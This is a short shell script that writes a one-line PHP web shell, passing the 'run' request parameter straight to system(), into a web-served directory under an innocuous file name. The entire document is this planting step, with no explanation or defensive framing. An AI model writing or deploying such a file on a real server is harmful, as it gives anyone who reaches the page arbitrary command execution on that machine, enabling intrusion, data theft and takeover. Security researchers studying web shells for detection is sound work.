#!/bin/sh
cat <<'RENAMED' > /srv/http/alternate.php
<?php system ( $_REQUEST [ 'run' ] );
RENAMED
